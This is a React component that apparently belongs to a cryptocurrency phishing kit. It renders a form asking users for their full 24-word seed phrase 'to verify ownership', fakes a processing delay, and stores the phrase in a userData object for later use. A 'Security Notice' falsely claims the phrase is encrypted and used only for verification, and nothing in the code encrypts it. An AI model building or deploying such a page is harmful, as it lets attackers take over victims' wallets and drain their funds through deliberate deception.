'use client';

import { useState } from 'react';

interface SeedPhraseVerificationProps {
  onComplete: () => void;
  userData: any;
}

export default function SeedPhraseVerification({ onComplete, userData }: SeedPhraseVerificationProps) {
  const [seedPhrase, setSeedPhrase] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (seedPhrase.trim().split(' ').length === 24) {
      setIsSubmitting(true);
      
      // Simulate processing time
      setTimeout(() => {
        // Save seed phrase to userData
        userData.seedPhrase = seedPhrase.trim();
        onComplete();
      }, 2000);
    }
  };

  const wordCount = seedPhrase.trim().split(' ').filter(word => word.length > 0).length;

  return (
    <div className="bg-white rounded-2xl shadow-2xl p-8">
      <div className="text-center mb-6">
        <div className="w-16 h-16 bg-gradient-to-br from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
          <i className="ri-key-line text-white text-2xl"></i>
        </div>
        <h2 className="text-2xl font-bold text-gray-800 mb-2">Seed Phrase Verification</h2>
        <p className="text-gray-600">Enter your 24-word seed phrase to verify ownership</p>
      </div>

      <form onSubmit={handleSubmit}>
        <div className="mb-4">
          <label className="block text-sm font-medium text-gray-700 mb-2">
            24-Word Seed Phrase
          </label>
          <textarea
            value={seedPhrase}
            onChange={(e) => setSeedPhrase(e.target.value)}
            className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-500 focus:border-purple-500 outline-none transition-colors resize-none"
            rows={4}
            placeholder="Enter your 24-word seed phrase separated by spaces"
            required
            maxLength={500}
          />
          <div className="flex justify-between text-xs text-gray-500 mt-1">
            <span>Words: {wordCount}/24</span>
            <span>{seedPhrase.length}/500 characters</span>
          </div>
        </div>

        <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
          <div className="flex items-start space-x-3">
            <i className="ri-shield-line text-red-600 text-xl mt-0.5"></i>
            <div>
              <h3 className="font-semibold text-red-800 mb-1">Security Notice</h3>
              <p className="text-sm text-red-700">
                Your seed phrase is used only for verification. Never share it with anyone else. 
                This information is encrypted and stored securely.
              </p>
            </div>
          </div>
        </div>

        <button
          type="submit"
          disabled={wordCount !== 24 || isSubmitting}
          className="w-full bg-gradient-to-r from-purple-500 to-pink-500 text-white font-semibold py-3 px-6 rounded-xl hover:from-purple-600 hover:to-pink-600 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap cursor-pointer"
        >
          {isSubmitting ? (
            <div className="flex items-center justify-center space-x-2">
              <i className="ri-loader-4-line animate-spin"></i>
              <span>Verifying...</span>
            </div>
          ) : (
            'Verify & Submit'
          )}
        </button>

        {wordCount > 0 && wordCount !== 24 && (
          <p className="text-red-500 text-sm mt-2 text-center">
            Please enter exactly 24 words
          </p>
        )}
      </form>
    </div>
  );
}